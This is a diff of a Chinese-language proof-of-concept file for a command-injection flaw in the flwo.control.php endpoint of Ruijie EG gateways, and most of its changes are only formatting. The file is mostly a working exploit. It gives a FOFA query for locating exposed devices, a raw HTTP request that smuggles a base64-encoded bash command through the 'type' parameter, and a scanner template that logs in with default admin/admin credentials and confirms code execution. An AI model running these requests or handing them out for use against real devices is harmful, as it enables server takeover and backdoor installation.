@@ -2,13 +2,14 @@
 
 锐捷EG易网关存在flwo.control.php命令执行漏洞，攻击者可利用该漏洞执行任意命令，写入后门，获取服务器权限，进而控制整个web服务器。 前提需要登录获取cookie
 
-
 ## fofa
+
 ```
 title="锐捷网络-EWEB网管系统"
 ```
 
 ## poc
+
 ```
 POST /flow_control_pi/flwo.control.php?a=flowOpen HTTP/1.1
 Host: localhost:4430
@@ -31,6 +32,7 @@ Accept-Encoding: gzip
 
 type=%7Cbash+-c+%27echo+cm0gLXJmIC4uLzEyMzMyMXF3ZS50eHQgJiYgZWNobyBGMDhiYmZiMkJDOGNlZUQ2ID4gLi4vMTIzMzIxcXdlLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%26%26+exit+0%27
 ```
+
 ![image](https://github.com/wy876/POC/assets/139549762/a4710fcd-de46-4774-8c69-de8f5a74dcb2)
 
 把管理员cookie填进去，然后写入文件
@@ -39,45 +41,44 @@ type=%7Cbash+-c+%27echo+cm0gLXJmIC4uLzEyMzMyMXF3ZS50eHQgJiYgZWNobyBGMDhiYmZiMkJD
 
 文件路径`http://127.0.0.1/123321qwe.txt`
 
-
 ## yaml
+
 ```
 http:
   - raw:
-	  - |              
-		POST /ddi/server/login.php HTTP/1.1
-		Host: 
-		Content-Type: application/x-www-form-urlencoded
-		User-Agent: Mozilla/5.0 
+      - |              
+        POST /ddi/server/login.php HTTP/1.1
+        Host: 
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 
 
-		username=admin&password=admin?
-	  - |              
-		POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
-		Host: 
-		Content-Type: application/x-www-form-urlencoded
-		Cookie: RUIJIEID={{cookie}};user=admin;
-		User-Agent: Mozilla/5.0 
+        username=admin&password=admin?
+      - |              
+        POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
+        Host: 
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: RUIJIEID={{cookie}};user=admin;
+        User-Agent: Mozilla/5.0 
 
-		type=%7Cbash+-c+%27echo+cm0gLXJmIC4uLzEyMzMyMXF3ZS50eHQgJiYgZWNobyBGMDhiYmZiMkJDOGNlZUQ2ID4gLi4vMTIzMzIxcXdlLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%26%26+exit+0%27
+        type=%7Cbash+-c+%27echo+cm0gLXJmIC4uLzEyMzMyMXF3ZS50eHQgJiYgZWNobyBGMDhiYmZiMkJDOGNlZUQ2ID4gLi4vMTIzMzIxcXdlLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%26%26+exit+0%27
 
-	  - |              
-		GET /123321qwe.txt HTTP/1.1
-		Host: 
-		User-Agent: Mozilla/5.0      
+      - |              
+        GET /123321qwe.txt HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0      
 
-	extractors:
-	  - type: regex
-		name: cookie
-		part: header
-		group: 1
-		internal: true
-		regex:
-		  - "RUIJIEID=(.*); path=/"
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        group: 1
+        internal: true
+        regex:
+          - "RUIJIEID=(.*); path=/"
 
-	matchers-condition: and
-	matchers:
-	  - type: dsl
-		dsl:
-		  - 'status_code_3==200 && contains(body_3, "F08bbfb2BC8ceeD6") && contains(body_3, "text/plain")'
-
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_3==200 && contains(body_3, "F08bbfb2BC8ceeD6") && contains(body_3, "text/plain")'
 ```
